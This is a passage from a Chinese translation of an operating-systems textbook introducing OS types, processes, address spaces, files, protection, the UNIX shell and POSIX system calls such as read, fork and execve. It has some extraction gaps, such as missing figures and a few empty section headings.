来自活动分区的这个装载模块被读入操作系统，并启动之。
然后，操作系统询问BIOS, 以获得配置信息。
对于每种设备，系统检查对应的设备驱动程序是否 存在。
如果没有，系统要求用户插入含有该设备驱动程序的CD-ROM (由设备供应商提供)或者从网络 上下载驱动程序。
一旦有了全部的设备驱动程序，操作系统就将它们调入内核。
然后初始化有关表格， 创建需要的任何背景进程，并在每个终端上启动登录程序或GUI。
1.4 操作系统大观园
操作系统已经存在了半个多世纪。
在这段时期内，出现了各种类型的操作系统，但并不是所有操作 系统都很知名。
本节中，我们将简要地介绍其中的9个。
在本书的后面，我们还将回顾其中的一些类型。
1.4.1 大型机操作系统
1.4.3 多处理器操作系统
个人计算机中近来出现了多核芯片，所以常规的台式机和笔记本电脑操作系统也开始与小规模的多 处理器打交道，而核的数量正在与时俱进。
幸运的是，由于先前多年的研究，已经具备不少关于多处理 器操作系统的知识，将这些知识运用到多核处理器系统中应该不存在困难。
难点在于要有能够运用所有 这些计算能力的应用。
许多主流操作系统，包括Windows和Linux, 都可以运行在多核处理器上。
1 .4 .4个人计算机操作系统
接着一类是个人计算机操作系统。
现代个人计算机操作系统都支持多道程序处理，在启动时，通常 有几十个程序开始运行。
它们的功能是为单个用户提供良好的支持。
这类系统广泛用于字处理、电子表 格、游戏和Internet 访问。
常见的例子是Linux 、FreeBSD 、Windows 7 、Windows 8和苹果公司的OS X。
个人计算机操作系统是如此地广为人知，所以不需要再做介绍了。
事实上，许多人甚至不知道还有其他 的操作系统存在。
1.4.5 掌上计算机操作系统
随着系统越来越小型化，我们看到了平板电脑、智能手机和其他掌上计算机系统。
掌上计算机或者 PDA (个人数字助理，Personal Digital Assistant) 是一种可以握在手中操作的小型计算机。
平板电脑和 智能手机是最为人熟知的例子。
正如我们看到的那样，这部分市场已经被谷歌的Android 系统和苹果的 iOS 主导，但它们仍有很多竞争对手。
大多数设备基于的是多核CPU、GPS、 摄像头及其他的传感器、 大量内存和精密的操作系统。
并且，它们都有多到数不清的第三方应用 (app)。
1.4.6 嵌入式操作系统
1.4.7 传感器节点操作系统
有许多用途需要配置微小传感器节点网络。
这些节点是一种可以彼此通信并且使用无线通信基站的 微型计算机。
这类传感器网络可以用于建筑物周边保护、国土边界保卫、森林火灾探测、气象预测用的 温度和降水测量、战场上敌方运动的信息收集等。
每个传感器节点是一个配有CPU 、RAM 、ROM 以及一个或多个环境传感器的实实在在的计算机。
节点上运行一个小型但是真实的操作系统，通常这个操作系统是事件驱动的，可以响应外部事件，或者 基于内部时钟进行周期性的测量。
该操作系统必须小且简单，因为这些节点的RAM很小，而且电池寿 命是一个重要问题。
另外，和嵌入式系统一样，所有的程序是预先装载的，用户不会突然启动从Internet 上下载的程序，这样就使得设计大为简化。
TinyOS 是一个用于传感器节点的知名操作系统。
1.4.8 实时操作系统
另一类操作系统是实时操作系统。
这些系统的特征是将时间作为关键参数。
例如，在工业过程控制 系统中，工厂中的实时计算机必须收集生产过程的数据并用有关数据控制机器。
通常，系统还必须满足 严格的最终时限。
例如，汽车在装配线上移动时，必须在限定的时间内进行规定的操作。
如果焊接机器 人焊接得太早或太迟，都会毁坏汽车。
如果某个动作必须绝对地在规定的时刻(或规定的时间范围)发 生，这就是硬实时系统。
可以在工业过程控制、民用航空、军事以及类似应用中看到很多这样的系统。
这些系统必须提供绝对保证，让某个特定的动作在给定的时间内完成。
另一类实时系统是软实时系统，在这种系统中，虽然不希望偶尔违反最终时限，但仍可以接受，并 且不会引起任何永久性的损害。
数字音频或多媒体系统就是这类系统。
智能手机也是软实时系统。
由于在(硬)实时系统中满足严格的时限是关键，所以操作系统就是一个简单的与应用程序链接的 库，各个部分必须紧密耦合并且彼此之间没有保护。
这种实时系统的例子有eCos。
1.4.9 智能卡操作系统
最小的操作系统运行在智能卡上。
智能卡是一种包含一块CPU芯片的信用卡。
它有非常严格的运行 能耗和存储空间的限制。
其中，有些智能卡只具有单项功能，如电子支付，但是其他的智能卡则拥有多 项功能，它们有专用的操作系统。
有些智能卡是面向Java的。
这意味着在智能卡的ROM中有一个Java 虚拟机 (Java Virtual Machine,
JVM) 解释器。
Java 小程序被下载到卡中并由JVM 解释器解释。
有些卡可以同时处理多个Java 小程序， 这就是多道程序，并且需要对它们进行调度。
在两个或多个小程序同时运行时，资源管理和保护就成为 突出的问题。
这些问题必须由卡上的操作系统(通常是非常原始的)处理。
1.5 操作系统概念
多数操作系统都使用某些基本概念和抽象，如进程、地址空间以及文件等，它们是需要理解的核心 内容。
作为引论，在下面的几节中，我们将较为简要地考察这些基本概念中的一部分。
在本书的后面， 我们将详细地讨论它们。
为了说明这些概念，我们有时使用示例，这些示例通常源自UNIX。
不过，类 似的例子在其他操作系统中也明显地存在，我们将在之后深入了解其中的一些操作系统。
1.5.1 进 程
在所有操作系统中，一个重要的概念是进程 (process) 。
进程本质上是正在执行的一个程序。
与每 个进程相关的是地址空间(address space),这是从某个最小值的存储位置(通常是零)到某个最大值的 存储位置的列表。
在这个地址空间中，进程可以进行读写。
该地址空间中存放有可执行程序、程序的数 据以及程序的堆栈。
与每个进程相关的还有资源集，通常包括寄存器(含有程序计数器和堆栈指针)、 打开文件的清单、突出的报警、有关进程清单，以及运行该程序所需要的所有其他信息。
进程基本上是 容纳运行一个程序所需要所有信息的容器。
进程的概念将在第2章详细讨论，不过，对进程建立一种直观感觉的最便利方式是分析一个多道程 序设计系统。
用户启动一个视频编辑程序，指示它按照某个格式转换一小时的视频(有时会花费数小时), 然后离开去浏览网页。
同时，一个被周期性唤醒、用来检查进来的电子邮件的后台进程会开始运行。
这 样，我们就有了(至少)三个活动进程：视频编辑器、Web 浏览器以及电子邮件接收程序。
操作系统周 期性地挂起一个进程然后启动运行另一个进程，这可能是由于在过去的一两秒钟内，第一个进程已使用 完分配给它的时间片。
一个进程暂时被挂起后，在随后的某个时刻里，该进程再次启动时的状态必须与先前暂停时完全相 同，这就意味着在挂起时该进程的所有信息都要保存下来。
例如，为了同时读入信息，进程打开了若干 文件。
与每个被打开文件有关的是指向当前位置的指针(即下一个将读出的字节或记录)。
在一个进程 暂时被挂起时，所有这些指针都必须保存起来，这样在该进程重新启动之后，所执行的读调用才能读到 正确的数据。
在许多操作系统中，与一个进程有关的所有信息，除了该进程自身地址空间的内容以外， 均存放在操作系统的一张表中，称为进程表 (process table),进程表是数组(或链表)结构，当前存在 的每个进程都要占用其中一项。
所以， 一个(挂起的)进程包括：进程的地址空间(往往称作磁芯映像，core image,纪念过去 使用的磁芯存储器),以及对应的进程表项(其中包括寄存器以及稍后重启动该进程所需要的许多其他 信息)。
与进程管理有关的最关键的系统调用是那些进行进程创建和进程终止的系统调用。
考虑一个典型的 例子。
有一个称为命令解释器 (command interpreter) 或shell 的进程从终端上读命令。
此时，用户刚键 入一条命令要求编译一个程序。
shell 必须先创建一个新进程来执行编译程序。
当执行编译的进程结束时，
它执行一个系统调用来终止自己。
若一个进程能够创建一个或多个进程(称为子进程), 而且这些进程又可以创建子进程，则很容易得到进程树， 如图1-13所示。
合作完成某些作业的相关进程经常需要彼 此通信以便同步它们的行为。
这种通信称为进程间通信 (interprocess communication), 将在第2章中详细讨论。
其他可用的进程系统调用包括：申请更多的内存(或 释放不再需要的内存)、等待一个子进程结束、用另一个程 序覆盖该程序等。
图1-13一个进程树。
进程A创建两个子进程B 和C, 进程B创建三个子进程D 、E和F
有时，需要向一个正在运行的进程传送信息，而该进程并没有等待接收信息。
例如，一个进程通过
网络向另一台机器上的进程发送消息进行通信。
为了保证一条消息或消息的应答不会丢失，发送者要求 它所在的操作系统在指定的若干秒后给一个通知，这样如果对方尚未收到确认消息就可以进行重发。
在 设定该定时器后，程序可以继续做其他工作。
在限定的秒数流逝之后，操作系统向该进程发送一个警告信号 (alarm signal)。
此信号引起该进程 暂时挂起，无论该进程正在做什么,系统将其寄存器的值保存到堆栈，并开始运行一个特别的信号处理 过程，比如重新发送可能丢失的消息。
这些信号是软件模拟的硬件中断，除了定时器到期之外，该信号 可以由各种原因产生。
许多由硬件检测出来的陷阱，如执行了非法指令或使用了无效地址等，也被转换 成该信号并交给这个进程。
系统管理器授权每个进程使用一个给定的UID(User IDentification)。
每个被启动的进程都有一个 启动该进程的用户UID。
子进程拥有与父进程一样的UID。
用户可以是某个组的成员，每个组也有一个 GID (Group IDentification)。
在UNIX中，有一个UID称为超级用户 (superuser), 或 者Windows中的管理员 (administrator), 它 具有特殊的权力，可以违背一些保护规则。
在大型系统中，只有系统管理员掌握着成为超级用户的密码， 但是许多普通用户(特别是学生)做出了可观的努力，试图找出系统的缺陷，从而使他们不用密码就可 以成为超级用户。
在第2章中，我们将讨论进程以及进程间通信的相关内容。
1.5.2 地址空间
每台计算机都有一些主存，用来保存正在执行的程序。
在非常简单的操作系统中，内存中一次只能 有一个程序。
如果要运行第二个程序，第一个程序就必须被移出内存，再把第二个程序装入内存。
较复杂的操作系统允许在内存中同时运行多道程序。
为了避免它们互相干扰(包括操作系统),需 要有某种保护机制。
虽然这种机制必然是硬件形式的，但是由操作系统掌控。
上述的观点涉及对计算机主存的管理和保护。
另一种不同但是同样重要并与存储器有关的内容，是 管理进程的地址空间。
通常，每个进程有一些可以使用的地址集合，典型值从0开始直到某个最大值。
在最简单的情形下，一个进程可拥有的最大地址空间小于主存。
在这种方式下，进程可以用满其地址空 间，而且内存中也有足够的空间容纳该进程。
但是，在许多32位或64位地址的计算机中，分别有2³²或2⁶⁴字节的地址空间。
如果一个进程有比计 算机拥有的主存还大的地址空间，而且该进程希望使用全部的内存，那怎么办呢?
在早期的计算机中， 这个进程只好“认命”了。
现在，有了一种称为虚拟内存的技术，正如前面已经介绍过的，操作系统可 以把部分地址空间装入主存，部分留在磁盘上，并且在需要时来回交换它们。
在本质上，操作系统创建 了一个地址空间的抽象，作为进程可以引用地址的集合。
该地址空间与机器的物理内存解耦，可能大于 也可能小于该物理空间。
对地址空间和物理空间的管理组成了操作系统功能的一个重要部分，整个第3 章都与这个主题有关。
1.5.3 文 件
实际上，支持操作系统的另一个关键概念是文件系统。
如前所述，操作系统的一项主要功能是隐藏 磁盘和其他I/O设备的细节特性，给提供程序员一个良好、清晰的独立于设备的抽象文件模型。
显然， 创建文件、删除文件、读文件和写文件等都需要系统调用。
在文件可以读取之前，必须先在磁盘上定位 和打开文件，在文件读过之后应该关闭该文件，有关的系统调用则用于完成这类操作。
进程和文件层次都可以组织成树状结构，但这两种树状结构有不少不同之处。
一般进程的树状结构 层次不深(很少超过三层),而文件树状结构的层次常常多达四层、五层或更多层。
进程树层次结构是 暂时的，通常最多存在几分钟，而目录层次则可能存在数年之久。
进程和文件在所有权及保护方面也是 有区别的。
典型地，只有父进程能控制和访问子进程，而在文件和目录中通常存在一种机制，使文件所
24 第 1 章
有者之外的其他用户也可以访问该文件。
图1-14 大学院系的文件系统
目录层结构中的每一个文件都可以通过从目录的顶部即根目录 (root directory)开始的路径名 (path name) 来确定。
绝对路径名包含了从根目录到该文件的所有目录清单，它们之间用正斜线隔开。
如在图1-14中，文件CS101的路径名是/Faculty/Prof.Brown/Courses/CS101 。
最开始的正斜线表示这是从 根目录开始的绝对路径。
顺便提及，出于历史原因在Windows 中用反斜线()字符作为分隔符，替代了 正斜线(1),这样，上面给出的文件路径会写为lFaculty\Prof.Brown\Courses\CS101 。
在本书中，我们一 般使用UNIX的路径惯例。
在实例中，每个进程有一个工作目录 (working directory),对于没有以斜线开头给出绝对地址的 路径，将在这个工作目录下寻找。
如在图1-14中的例子，如果/Faculty/Prof.Brown 是工作目录，那么 Courses/CS101 与上面给定的绝对路径名表示的是同一个文件。
进程可以通过使用系统调用指定新的工 作目录，从而变更其工作目录。
在读写文件之前，首先要打开文件，检查其访问权限。
若权限许可，系统将返回一个小整数，称作 文件描述符 (file descriptor),供后续操作使用。
若禁止访问，系统则返回一个错误码。
UNIX中的另一个重要概念是安装文件系统。
大多数台式机都有一个或多个光盘驱动器，可以插入CD ROM、DVD 和蓝光光盘。
它们几乎都有USB 接口，可以插入USB 存储棒(实际是固态磁盘驱动器)。
为了 提供一个出色的方式处理可移动介质，UNIX 允许把光盘上的文件系统接到主文件树上。
考虑图1-15a的情 形。
在mount 调用之前，根文件系统在硬盘上，而第二个文件系统在CD-ROM上，它们是分离且无关的。
a) b)
图1-15 a) 在安装前，CD-ROM上的文件不可访问；b) 在安装后，它们成了文件层次的一部分
在UNIX中，另一个重要的概念是特殊文件 (special file)。
提供特殊文件是为了使I/O设备看起来像 文件一般。
这样，就像使用系统调用读写文件一样，I/O 设备也可通过同样的系统调用进行读写。
有两 类特殊文件：块特殊文件 (block special file) 和字符特殊文件 (character special file)。
块特殊文件指那 些由可随机存取的块组成的设备，如磁盘等。
比如打开一个块特殊文件，然后读第4块，程序可以直接 访问设备的第4块而不必考虑存放该文件的文件系统结构。
类似地，字符特殊文件用于打印机、调制解 调器和其他接收或输出字符流的设备。
按照惯例，特殊文件保存在/dev目录中。
例如，/dev/Ip 是打印机
(曾经称为行式打印机)。
本小节中讨论的最后一个特性既与进程有关也与文件有关：管道。
管道 (pipe) 是一种虚文件，它可连接两个进程，如图1-16所示。
如果 进程A和B 希望通过管道对话，它们必须提前设置该管道。
当进程A 想 对进程B发送数据时，它把数据写到管道上，仿佛管道就是输出文件一 样。
进程B可以通过读该管道而得到数据，仿佛该管道就是一个输入文
进程 进程
图1-16 由管道连接的两个进程
件一样。
这样，在UNIX中两个进程之间的通信就非常类似于普通文件的读写了。
更为强大的是，若进 程想发现它所写入的输出文件不是真正的文件而是管道，则需要使用特殊的系统调用。
文件系统是非常 重要的。
我们将在第4章以及第10章和第11章中具体讨论它们。
1.5.4 输入/输出
所有的计算机都有用来获取输入和产生输出的物理设备。
毕竟，如果用户不能告诉计算机该做什么, 而在计算机完成了所要求的工作之后竟不能得到结果，那么计算机还有什么用处呢?
有各种类型的输入 和输出设备，包括键盘、显示器、打印机等。
对这些设备的管理全然依靠操作系统。
所以，每个操作系统都有管理其I/O设备的I/O子系统。
某些I/O软件是设备独立的，即这些I/O软件 部分可以同样应用于许多或者全部的I/O 设备上。
I/O 软件的其他部分，如设备驱动程序，是专门为特定 的I/O设备设计的。
在第5章中，我们将讨论I/O 软件。
1.5.5 保 护
计算机中有大量的信息，用户经常希望对其进行保护，并保守秘密。
这些信息包括电子邮件、商业 计划、退税等诸多内容。
管理系统的安全性完全依靠操作系统，例如，文件仅供授权用户访问。
作为一个简单的例子，以便读者对如何实现安全有一个概念，请考察UNIX。
UNIX 操作系统通过对 每个文件赋予一个9位的二进制保护代码，对UNIX中的文件实现保护。
该保护代码有三个3位字段， 一 个用于所有者， 一个用于与所有者同组(用户被系统管理员划分成组)的其他成员， 一个用于其他人。
每个字段中有一位用于读访问，一位用于写访问，一位用于执行访问。
这些位就是知名的rwx 位。
例如， 保护代码rwxr-X--x的含义是所有者可以读、写或执行该文件，其他的组成员可以读或执行(但不能写) 该文件，而其他人可以执行(但不能读和写)该文件。
对一个目录而言，x 的含义是允许查询。
一条短 横线的含义是，不存在对应的许可。
除了文件保护之外，还有很多有关安全的问题。
保护系统不被人类或非人类(如病毒)入侵，则是 其中之一。
我们将在第9章中研究各种安全性问题。
1.5.6 shell
操作系统是进行系统调用的代码。
编辑器、编译器、汇编程序、链接程序、效用程序以及命令解释 器等，尽管非常重要，也非常有用，但是它们确实不是操作系统的组成部分。
为了避免可能发生的混淆， 本小节将大致介绍一下UNIX 的命令解释器，称为shell。
尽 管shell本身不是操作系统的一部分，但它体
26 第 1 章
现了许多操作系统的特性，并很好地说明了系统调用的具体用法。
shell 同时也是终端用户与操作系统之 间的接口，除非用户使用的是图形用户界面。
有许多种shell, 如 sh 、csh 、ksh 以 及bash 等。
它们全部支 持下面所介绍的功能，这些功能可追溯到早期的shell ( 即sh)。
用户登录时，同时启动了一个shell。
它以终端作为标准输入和标准输出。
首先显示提示符(prompt), 它可能是一个美元符号，提示用户shell正在等待接收命令。
假如用户键入
date
shell创建一个子进程，并运行date程序作为子进程。
在该子进程运行期间，shell等待它结束。
在子进程 结 束 后 ，shell 再次显示提示符，并等待下一行输入。
用户可以将标准输出重定向到一个文件，如键入
date>file
同样，也可以将标准输入重定向，如：
sort <file1>file2
该命令调用sort 程序，从file1中取得输入，输出送到file2。
可以将一个程序的输出通过管道作为另一程序的输入，因此有
cat file1 file2 file3|sort>/dev/lp
所调用的cat 程序将这三个文件合并，其结果送到sort 程序并按字典序排序。
sort 的输出又被重定向到文 件/dev/lp 中，显然，这是打印机。
将启动sort 程序作为后台任务执行，这样就允许用户继续工作，而sort 命令也继续进行。
shell 还有许多其 他有用的特性，由于篇幅有限而不能在这里讨论。
有许多UNIX 的书籍具体地讨论了shell ( 例 如 ， Kernighan 和Pike,1984;Quigley,2004;Robbins,2005)。
1.5.7 个体重复系统发育
在达尔文的《物种起源》 (On the Origin of the Species) 一书出版之后，德国动物学家Ernst Haeckel 论述了“个体重复系统发育”(ontogeny recapitulates phylogeny)。
他这句话的含义是，个体重 复着物种的演化过程。
换句话说，在一个卵子受精之后成为人体之前，这个卵子要经过是鱼、是猪等阶 段。
现代生物学家认为这是一种粗略的简化，不过这种观点仍旧包含了真理的核心部分。
在本书中，暂时消失的结果会造成我们有时需要反复考察一些“过时”的概念，即那些在当代技术 中并不理想的思想。
而技术的变化会把一些“过时概念”带回来。
正由于此，更重要的是要理解为什么 一个概念会过时，什么样环境的变化又会启用“过时概念”。
为了把这个观点叙述得更透彻，我们考虑一些例子。
早期计算机采用了硬连线指令集。
这种指令可 由硬件直接执行，且不能改变。
然后出现了微程序设计(首先在IBM 360上大规模引入),其中的解释器执 行软件中的指令。
于是硬连线执行过时了，因为不够灵活。
接着发明了RISC 计算机，微程序设计(即解 释执行)过时了，这是因为直接执行更快。
而在通过Internet 发送并且到达时才解释的Java 小程序形式中， 我们又看到了解释执行的复苏。
执行速度并不总是关键因素，但由于网络的延迟非常大，以至于它成了主 要因素。
这样，“钟摆”在直接执行和解释执行之间已经晃动了好几个周期，也许在未来还会再次晃动。
1. 大型内存
现在来分析硬件的某些历史发展过程，并看看硬件是如何重复地影响软件的。
第一代大型机内存有 限。
在1959年至1964年之间，称为“山寨王”的IBM 7090或7094满载也只有128KB多的内存。
该机器 多数用汇编语言编程，为了节省内存，其操作系统用汇编语言编写。
随着时间的推移，在汇编语言宣告过时时，FORTRAN 和COBOL 之类语言的编译器已经足够好了。
但是在第一个商用小型计算机(PDP-1) 发布时，却只有4096个18位字的内存，而且令人吃惊的是，汇 编语言又回来了。
最终，小型计算机获得了更多的内存，而且高级语言也在小型机上盛行起来。
在20世纪80年代早期微型计算机出现时，第一批机器只有4KB内存，汇编语言又复活了。
嵌入式计 算机经常使用和微型计算机一样的CPU芯片(8080、Z80 、后来的8086),而且一开始也使用汇编编程。
现在，它们的后代——个人计算机拥有大量的内存，使用C、C++、Java 和其他高级语言编程。
智能卡 正在走着类似的发展道路，而且除了确定的大小之外，智能卡通常使用Java 解释器，解释执行Java 程序， 而不是将Java编译成智能卡的机器语言。
2. 保护硬件
早期的IBM 7090/7094等大型机没有保护硬件，所以这些机器一次只运行一个程序。
一个有问题 的程序就可能毁掉操作系统，并且很容易使机器崩溃。
在IBM 360发布时，提供了保护硬件的原型， 这些机器可以在内存中同时保持若干程序，并让它们轮流运行(多道程序处理)。
于是单道程序处理宣 告过时。
至少是到了第一个小型计算机出现时——还没有保护硬件——所以多道程序处理也不可能有。
尽管 PDP-1 和PDP-8 没有保护硬件，但是PDP-11 型机器有了保护硬件，这一特点导致了多道程序处理的应用， 并且最终导致UNIX操作系统的诞生。
现在来考察操作系统。
第一代大型机原本没有保护硬件，也不支持多道程序处理，所以这些机器只 运行简单的操作系统， 一次只能手工装载一个程序。
后来，大型机有了保护硬件，操作系统可以同时支 持运行多个程序，接着系统拥有了全功能的分时能力。
在小型计算机刚出现时，也没有保护硬件， 一次只运行一个手工装载的程序。
逐渐地，小型机有了 保护硬件，有了同时运行两个或更多程序的能力。
第一代微型计算机也只有一次运行一个程序的能力， 但是随后具有了一次处理多道程序的能力。
掌上计算机和智能卡也走着类似的发展之路。
3.硬盘
早期大型机主要是基于磁带的。
机器从磁带上读入程序、编译、运行，并把结果写到另一个磁带上。
那时没有磁盘也没有文件系统的概念。
在IBM 于1956年引入第一个磁盘——RAMAC(RAndoM ACcess)
之后，事情开始变化。
这个磁盘占据4平方米空间，可以存储500万7位长的字符，这足够存储一张中等 分辨率的数字照片。
但是其年租金高达35000美元，比存储占据同样空间数量的胶卷还要贵。
不过这个 磁盘的价格终于还是下降了，并开始出现了原始的文件系统。
拥有这些新技术的典型机器是CDC 6600,该机器于1964年发布，在多年之内始终是世界上最快的 计算机。
用户可以通过指定名称的方式创建所谓“永久文件”,希望这个名称还没有被别人使用，比如 “data” 就是一个适合于文件的名称。
这个系统使用单层目录。
后来在大型机上开发出了复杂的多层文件 系统，MULTICS 文件系统可以算是多层文件系统的顶峰。
接着小型计算机投入使用，该机型最后也有了硬盘。
1970年在PDP-11上引入了标准硬盘——RK05 磁盘，容量为2.5MB, 只 有IBM RAMAC一半的容量，但是这个磁盘的直径只有40厘米，5厘米厚。
不过， 其原型也只有单层目录。
随着微型计算机的出现，CP/M 开始成为操作系统的主流，但是它也只是在 (软)盘上支持单目录。
4. 虚拟内存
虚拟内存(安排在第3章中讨论)通过在RAM 和磁盘中反复移动信息块的方式，提供了运行比机 器物理内存大的程序的能力。
虚拟内存也经历了类似的历程，首先出现在大型机上，然后是小型机和 微型机。
虚拟内存还使得程序可以在运行时动态地链接库，而不是必须在编译时链接。
MULTICS 是第 一个可以做到这点的系统。
最终，这个思想传播到所有的机型上，现在广泛用于多数UNIX和Windows 系统中。
在所有这些发展过程中，我们看到，在一种环境中出现的思想，随着环境的变化被抛弃(汇编语言 设计、单道程序处理、单层目录等),通常在十年之后，该思想在另一种环境下又重现了。
由于这个原 因，本书中，我们将不时回顾那些在今日的吉字节PC中过时的思想和算法，因为这些思想和算法可能会 在嵌入式计算机和智能卡中再现。
1.6 系统调用
我们已经看到操作系统具有两种功能：为用户程序提供抽象和管理计算机资源。
在多数情形下，用 户程序和操作系统之间的交互处理的是前者，例如，创建、写入、读出和删除文件。
对用户而言，资源 管理部分主要是透明和自动完成的。
这样，用户程序和操作系统之间的交互主要就是处理抽象。
为了真 正理解操作系统的行为，我们必须仔细地分析这个接口。
接口中所提供的调用随着操作系统的不同而变 化(尽管基于的概念是类似的)。
这样我们不得不在如下的可能方式中进行选择：(1)含混不清的一般性叙述(“操作系统提供读取 文件的系统调用”);(2)某个特定的系统(“UNIX 提供一个有三个参数的read 系统调用：一个参数指 定文件，一个说明数据应存放的位置，另一个说明应读出多少字节”)。
我们选择后一种方式。
这种方式需要更多的努力，但是它能更多地洞察操作系统具体在做什么。
尽 管这样的讨论会涉及专门的POSIX(International Standard 9945-1),以 及UNIX 、System V 、BSD、 Linux 、MINIX 3等，但是多数现代操作系统都有实现相同功能的系统调用，尽管它们在细节上差别很大。
由于引发系统调用的实际机制是非常依赖于机器的，而且必须用汇编代码表达，所以，通过提供过程库 使C程序中能够使用系统调用，当然也包括其他语言。
为了使系统调用机制更清晰，我们简要地考察read 系统调用。
如上所述，它有三个参数：第一个参数 指定文件，第二个指向缓冲区，第三个说明要读出的字节数。
几乎与所有的系统调用一样，它的调用由C 程序完成，方法是调用一个与该系统调用名称相同的库过程：read 。
由C程序进行的调用形式如下：
count =read(fd,buffer,nbytes);
系统调用(以及库过程)在count 中返回实际读出的字节数。
这个值通常和nbytes 相同，但也可能更小，
例如，如果在读过程中遇到了文件尾的情形就是如此。
如果系统调用不能执行，不论是因为无效的参数还是磁盘错误，count 都会被置为-1,而在全局变 量errno 中放入错误号。
程序应该经常检查系统调用的结果，以了解是否出错。
系统调用是通过一系列的步骤实现的。
为了更清楚地说明这个概念，考察上面的read 调用。
在准备 调用这个实际用来进行read 系统调用的read 库过程时，调用程序首先把参数压进堆栈，如图1-17中步 骤1～步骤3所示。
图1-17 完成系统调用read(fd,buffer,nbytes) 的11个步骤
由于历史的原因，C以及C++编译器使用逆序(必须把第一个参数赋给printf (格式字符串),放在 堆栈的顶部)。
第一个和第三个参数是值调用，但是第二个参数通过引用传递，即传递的是缓冲区的地 址(由&指示),而不是缓冲区的内容。
接着是对库过程的实际调用(第4步)。
这个指令是用来调用所 有过程的正常过程调用指令。
在可能是由汇编语言写成的库过程中， 一般把系统调用的编号放在操作系统所期望的地方，如寄存 器中(第5步)。
然后执行一个TRAP指令，将用户态切换到内核态，并在内核中的一个固定地址开始执 行(第6步)。
TRAP 指令实际上与过程调用指令非常类似，它们后面都跟随一个来自远处位置的指令， 以及供以后使用的一个保存在栈中的返回地址。
然而，TRAP 指令与过程指令存在两个方面的差别。
首先，它的副作用是，切换到内核态。
而过程 调用指令并不改变模式。
其次，不像给定过程所在的相对或绝对地址那样，TRAP指令不能跳转到任意 地址上。
根据机器的体系结构，或者跳转到一个单固定地址上，或者指令中有一8位长的字段，它给定 了内存中一张表格的索引，这张表格中含有跳转地址。
跟随在TRAP 指令后的内核代码开始检查系统调用编号，然后分派给正确的系统调用处理器，这通常 是通过一张由系统调用编号所引用的、指向系统调用处理器的指针表来完成(第7步)。
此时，系统调用 处理器运行(第8步)。
一旦系统调用处理器完成其工作，控制可能会在跟随TRAP 指令后面的指令中返回 给用户空间库过程(第9步)。
这个过程接着以通常的过程调用返回的方式，返回到用户程序(第10步)。
在前面第9步中，我们提到“控制可能会在跟随TRAP 指令后面的指令中返回给用户空间库过程”, 这是有原因的。
系统调用可能堵塞调用者，避免它继续执行。
例如，如果试图读键盘，但是并没有任何 键入，那么调用者就必须被阻塞。
在这种情形下，操作系统会查看是否有其他可以运行的进程。
稍后， 当需要的输入出现时，进程会提醒系统注意，然后步骤9～步骤11会接着进行。
下面几小节中，我们将考察一些常用的POSIX 系统调用，或者用更专业的说法，考察进行这些系统 调用的库过程。
POSIX 大约有100个过程调用，它们中最重要的过程调用列在图1-18中。
为方便起见， 它们被分成4类。
我们用文字简要地叙述其作用。
进程管理
文件管理
目录和文件系统管理
杂 项
图1-18 一些重要的POSIX系统调用。
若出错则返回代码s 为-1。
返回代码如下：pid 是进程的id,fd 是文 件描述符，n 是字节数，position 是在文件中的偏移量，而seconds是流逝时间。
参数在正文中解释
有必要指出，将POSIX 过程映射到系统调用并不是一对一的。
POSIX 标准定义了构造系统所必须 提供的一套过程，但是并没有规定它们是系统调用、库调用还是其他的形式。
如果不通过系统调用就可 以执行一个过程(即无须陷入内核),那么从性能方面考虑，它通常会在用户空间中完成。
不过，多数 POSIX过程确实进行系统调用，通常是一个过程直接映射到一个系统调用上。
在一些情形下，特别是所 需要的过程仅仅是某个调用的变体时，一个系统调用会对应若干个库调用。
1.6.1 用于进程管理的系统调用
图1-18中的第一组调用用于进程管理。
将有关fork (派生)的讨论作为本节的开始是较为合适的。
在UNIX中 ，fork 是唯一可以在POSIX中创建进程的途径。
它创建一个原有进程的精确副本，包括所有的 文件描述符、寄存器等内容。
在fork 之后，原有的进程及其副本(父与子)就分开了。
在fork 时，所有 的变量具有一样的值，虽然父进程的数据被复制用以创建子进程，但是其中一个的后续变化并不会影响 到另一个。
(由父进程和子进程共享的程序正文，是不可改变的。
)fork 调用返回一个值，在子进程中该 值为零，并且在父进程中等于子进程的进程标识符 (Process IDentifier,PID)。
使用返回的PID, 就 可 以在两个进程中看出哪一个是父进程，哪一个是子进程。
多数情形下，在fork 之后，子进程需要执行与父进程不同的代码。
这里考虑shell 的情形。
它从终端 读取命令，创建一个子进程，等待该子进程执行命令，在该子进程终止时，读入下一条命令。
为了等待 子进程结束，父进程执行waitpid 系统调用，它只是等待，直至子进程终止(若有多个子进程的话，则直 至任何一个子进程终止)。
waitpid 可以等待一个特定的子进程，或者通过将第一个参数设为-1的方式， 等待任何一个老的子进程。
在waitpid 完成之后，将把第二个参数statloc 所指向的地址设置为子进程的退 出状态(正常或异常终止以及退出值)。
有各种可使用的选项，它们由第三个参数确定。
例如，如果没 有已经退出的子进程则立即返回。
现在考虑shell 如何使用fork 。
在键入 一 条命令后，shell 调 用fork 创建一个新的进程。
这个子进程必 须执行用户的命令。
通过使用execve 系统调用可以实现这一点，这个系统调用会引起其整个核心映像被 一个文件所替代，该文件由第一个参数给定。
(实际上，该系统调用自身是exec 系统调用，但是若干个 不同的库过程使用不同的参数和稍有差别的名称调用该系统调用。
在这里，我们把它们都视为系统调用。
) 在图1-19中，用一个高度简化的shell 说 明fork 、waitpid 以 及execve 的使用。
图1-19 一个shell (在本书中，TRUE 都被定义为1)
在最一般情形下，execve 有三个参数：将要执行的文件名称， 一个指向变量数组的指针，以及一 个指向环境数组的指针。
这里对这些参数做一个简要的说明。
各种库例程，包括execl 、execv 、execle 以及execve, 允许略掉参数或以各种不同的方式给定。
在本书中，我们在所有涉及的地方使用exec 描述 系统调用。
下面考虑诸如
cp file1 file2
的命令，该命令将file1 复制到 file2 。
在 shell 创建进程之后，该子进程定位和执行文件cp, 并将源文件 名和目标文件名传递给它。
cp 主程序(以及多数其他C 程序的主程序)都有声明
main(argc,argv,envp)
其中argc 是该命令行内有关参数数目的计数器，包括程序名称。
例如，上面的例子中，argc 为3。
第二个参数argv 是一个指向数组的指针。
该数组的元素是指向该命令行第i 个字符串的指针。
在本 例 中 ，argv[0] 指向字符串 “cp”,argv[1] 指向字符串 “file1”,argv[2] 指向字符串 “file2”。
main的第三个参数envp 是一个指向环境的指针，该环境是一个数组，含有name=value 的赋值形式， 用以将诸如终端类型以及根目录等信息传送给程序。
还有供程序调用的库过程，用来取得环境变量，这 些变量通常用来确定用户希望如何完成特定的任务(例如，使用默认打印机)。
在图1-19中，没有环境
参数传递给子进程，所以execve 的第三个参数为0。
